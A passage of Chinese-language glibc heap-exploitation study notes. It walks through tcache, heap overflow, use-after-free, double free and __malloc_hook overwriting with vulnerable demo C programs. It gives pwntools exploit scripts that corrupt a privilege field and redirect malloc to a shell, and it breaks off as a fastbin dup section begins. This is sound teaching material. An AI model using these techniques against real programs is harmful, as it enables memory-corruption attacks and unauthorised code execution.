<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJenOz1ew0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJenOz1ew0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/B145MyxPR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B145MyxPR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>第一段0x290為Tcache(tcache_perthread_struct)<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyvFSklPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyvFSklPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>memset後會把0x20個A，寫到ptr1(觀察圖片那段0x41，那就是user data段)</p>
<p>觀察一下0x555555559290，左邊都是0(因為上一塊是Tcache，所以這塊是Tcace的data)，右邊是size跟p bit，上一個chunk還在使用為1，大小為0x40，故顯示0x41</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1xVHE1gPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1xVHE1gPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>之後開始free掉ptr1</p>
<p>ptr1 那塊 fd指向 0x0，並且後面那塊被蓋成了奇怪的東西(要注意，這裡不是bk，而是tcache的key)<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1rgk1ZvC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1rgk1ZvC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1WE8JxPR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1WE8JxPR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>接下來開始看free掉ptr1</p>
</blockquote>
<p>可以看到tcache的0x40 entry -&gt; free掉的ptr1(跟fast bin不一樣，指向的不是header，是fd、bk那行)<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1yalWlPR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1yalWlPR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>可以先看到第二行，可以看到0x40 cnt為1</p>
<p>另外0x5555555590a0為0x40 entry -&gt; 0x5555555592a0<br><div class="img-item" data-src="https://hackmd.io/_uploads/r1o2w1eDA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1o2w1eDA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>另外你會看到bk變成了怪怪的一串數字，那是tcache key，用於保護，而ptr1 fd -&gt; 0x0<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJFSC0gwA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJFSC0gwA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>free掉ptr2</p>
</blockquote>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rytd7WlD0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rytd7WlD0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>cnt 0x40變2，tcache的0x40 entry -&gt; 0x00005555555592e0(ptr2)<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkWWNZgvA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkWWNZgvA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJI50ClwA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJI50ClwA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>ptr2 的 fd會指向 ptr1</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJIi0RgDR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJIi0RgDR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>以此類推最後像這樣<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkSTXWevA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkSTXWevA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/B1oNkybwR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1oNkybwR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="malloc-calloc-reaclloc"><a href="#malloc-calloc-reaclloc" class="headerlink" title="malloc &amp; calloc &amp; reaclloc"></a>malloc &amp; calloc &amp; reaclloc</h2><p><a target="_blank" rel="noopener" href="https://medium.com/@adwait.purao/dynamic-memory-allocation-in-c-using-malloc-calloc-free-and-realloc-e23cc8cb3d9c">https://medium.com/@adwait.purao/dynamic-memory-allocation-in-c-using-malloc-calloc-free-and-realloc-e23cc8cb3d9c</a></p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><a target="_blank" rel="noopener" href="https://tw.gitbook.net/c_standard_library/c_function_malloc.html">https://tw.gitbook.net/c_standard_library/c_function_malloc.html</a><br>void *malloc(size_t size)</p>
<p>size_t size -&gt; 大小</p>
<h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h3><p><a target="_blank" rel="noopener" href="https://tw.gitbook.net/c_standard_library/c_function_calloc.html">https://tw.gitbook.net/c_standard_library/c_function_calloc.html</a><br>void *calloc(size_t nitems, size_t size)</p>
<p>size_t nitems -&gt; 元素數<br>size_t size -&gt; 每個元素size</p>
<h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><p><a target="_blank" rel="noopener" href="https://tw.gitbook.net/c_standard_library/c_function_realloc.html">https://tw.gitbook.net/c_standard_library/c_function_realloc.html</a><br>void *realloc(void *ptr, size_t size)</p>
<p>void *ptr -&gt; 曾經分配過的空間pointer<br>size_t size -&gt; 分配大小</p>
<div class="table-responsive">
<table class="table table-bordered table-striped">
<thead>
<tr>
<th>條件</th>
<th>等價</th>
</tr>
</thead>
<tbody><tr>
<td>ptr &#x3D; NULL</td>
<td>malloc(size)</td>
</tr>
<tr>
<td>size &#x3D; 0</td>
<td>free(*ptr)</td>
</tr>
</tbody></table>
<h2 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk &amp; sbrk"></a>brk &amp; sbrk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;</span><br></pre></td></tr></table></figure>

<p>會去改變program break的位置<br>program break 是 data segments end point，也就是heap結束位置</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkQP55wRA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkQP55wRA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>將資料寫入heap時，沒有控制輸入長度，導致可以覆寫到其他heap位置</p>
<h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> privilege;</span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">char</span> reserved[<span class="number">0x18</span>];</span><br><span class="line">&#125; Info;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    Info *info;</span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello~\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;give me your msg: \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    msg = <span class="built_in">malloc</span>(<span class="number">40</span>);</span><br><span class="line">    info = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Info));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(info-&gt;name, <span class="string">&quot;User&quot;</span>);</span><br><span class="line">    info-&gt;privilege = <span class="number">2</span>;</span><br><span class="line">    info-&gt;msg = msg;</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, msg, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Checking privilege...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (info-&gt;privilege == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello Admin %s\n&quot;</span>, info-&gt;name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your privilege is too low QQ, Bye %s\n&quot;</span>, info-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>看一下parseheap你會看到malloc了兩塊，一塊0x30，一塊0x40<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByFcNNzDR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByFcNNzDR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>第一塊read了0x40，大於40(0x28)，可以heap overflow</p>
<p>像這樣你就發現輸出的User已經變成了一堆a了<br><div class="img-item" data-src="https://hackmd.io/_uploads/BkjMvEfDR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkjMvEfDR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>第二塊架構是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> privilege;</span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">char</span> reserved[<span class="number">0x18</span>];</span><br><span class="line">&#125; Info;</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJwFSNGDA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJwFSNGDA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x5555555592c0:	0x0000000000000000	0x0000000000000041 (header)</span><br><span class="line">0x5555555592d0:	0x0000000072657355	0x0000000000000002 (User、privilege)</span><br><span class="line">0x5555555592e0:	0x00005555555592a0	0x0000000000000000 (*msg、reserve)</span><br><span class="line">0x5555555592f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然後看到read，會把東西讀到第一塊chunk</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HkOwUEzwA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkOwUEzwA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>要蓋掉User、privilege</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/S10aLVGPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S10aLVGPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x555555559290:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x5555555592a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555555592b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555555592c0:	0x0000000000000000	0x0000000000000041(蓋0x30蓋到這裡)</span><br><span class="line">0x5555555592d0:	0x0000000072657355	0x0000000000000002</span><br><span class="line">0x5555555592e0:	0x00005555555592a0	0x0000000000000000</span><br><span class="line">0x5555555592f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./heapoverflow&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+<span class="string">b&#x27;NAUP\0\0\0\0&#x27;</span>+p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>這樣就成功了<br><div class="img-item" data-src="https://hackmd.io/_uploads/S14udEGPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S14udEGPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF(use after free)"></a>UAF(use after free)</h2><p>我們把指標丟給free，會把指標指向的chunk free掉</p>
<p>如果free掉後，沒有清空pointer就可能會有問題(可以用來information leak)<br>又稱dangling pointer</p>
<p>後續繼續在這個chunk上做操做就是UAF</p>
<h3 id="讀取pointer"><a href="#讀取pointer" class="headerlink" title="讀取pointer"></a>讀取pointer</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> *ptr3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ptr1, ptr2 are dangling pointers now.</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, ptr1, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr1 fd: %#llx\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, ptr2, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr2 fd: %#llx\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, ptr3, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr3 fd: %#llx\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>舉這個程式為例，你就會發現當你已經free掉這三塊chunk後你在針對三個ptr去做讀取，可以讀到fd三個值</p>
<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>可以free同一塊chunk兩次</p>
<p>會出現幾個狀況<br>Tcache or fast bin鍊上會出現兩次相同的chunk</p>
<p>那如果我再次malloc他呢?</p>
<p>那就會出現他記憶體給你了變成allocated chunk，但他還在鏈表，變成了既被free，又被allocate的狀況</p>
<h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>在malloc&#x2F;free&#x2F;realloc&#x2F;calloc 進到分配相關演算法之前，若有設定hook function，會先進入hook</p>
<p>若可以寫入hook，那就可以就可以control執行流程</p>
<p>也可以寫入Onegadget來get shell</p>
<h3 id="Glibc-source-code"><a href="#Glibc-source-code" class="headerlink" title="Glibc source code"></a>Glibc source code</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3022">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3022</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>可以看到他在往下執行前先去read <code>__malloc_hook</code>並執行他</p>
<h3 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;backdoor: %p\n&quot;</span>, get_shell);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf    : %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>, &amp;ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>, &amp;value);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr = value;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>告訴你shell在哪裡(可以無視PIE了)，然後給你printf(也給你libc base了，可以推算hook function在哪裡)</p>
<p>然後要你寫入一個adress跟value，並往那個adress寫入value<br>那如果你把malloc_hook位置改寫成shell，那你進malloc讀出來的東西就是shell的adress，然後他就會去執行shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./hookdemo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_offset=<span class="number">0x61c90</span> </span><br><span class="line"></span><br><span class="line">shell_address=r.recvline().strip().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>][<span class="number">1</span>:]</span><br><span class="line">shell_address=<span class="built_in">int</span>(shell_address.decode(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shell_address: &quot;</span>,<span class="built_in">hex</span>(shell_address))</span><br><span class="line"></span><br><span class="line">leak_libc=r.recvline().strip().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>][<span class="number">1</span>:]</span><br><span class="line">leak_libc=<span class="built_in">int</span>(leak_libc.decode(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base=leak_libc-printf_offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_libc: &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc base: &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">hook=<span class="number">0x1ecb70</span>+libc_base</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Address:&quot;</span>,<span class="built_in">hex</span>(hook))</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Value:&quot;</span>,<span class="built_in">hex</span>(shell_address))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryrnZIMP0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryrnZIMP0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="fastbin-dup-glibc-2-23"><a href="#fastbin-dup-glibc-2-23" class="headerlink" title="fastbin dup(glibc 2.23)"></a>fastbin dup(glibc 2.23)</h2><p>可以double free讓chunk被free兩次<br>之後我malloc，此時chunk會同時是allocate和free chunk，這時候我可以寫入蓋掉fd，讓fd指向任意位置</p>
<p>這時候再次malloc會讓我拿到一塊我剛剛改寫fd指向的地方</p>
<p>這時候就可以任意寫入了</p>
<h3 id="示意"><a href="#示意" class="headerlink" title="示意"></a>示意</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin</span><br><span class="line"></span><br><span class="line">chunk 1(allocate)</span><br><span class="line">chunk 2(allocate)</span><br></pre></td></tr></table></figure>

<p>現在我們先free掉chunk 1、chunk 2</p>
